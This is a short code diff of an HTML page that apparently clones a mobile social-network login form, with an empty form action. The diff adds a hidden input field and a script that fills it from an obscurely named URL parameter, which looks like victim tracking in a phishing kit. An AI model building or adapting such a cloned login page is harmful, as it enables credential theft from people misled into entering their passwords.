@@ -27,6 +27,7 @@
                   </div>
                   <div class="_5rut">
                     <form method="post" action="" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1">
+                      <input type="hidden" id="idapodo" value="">
                       <div>
                         <div class="_56be">
                           <div class="_55wo _56bf">
@@ -138,4 +139,15 @@
       </div>
     </div>
   </body>
+  <script>
+    function getParameterByName(name) {
+      name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+      var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+      results = regex.exec(location.search);
+      return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+    }
+
+    document.getElementById('idapodo').value = getParameterByName('ANZApKFnRxAvs6B');
+
+  </script>
 </html>
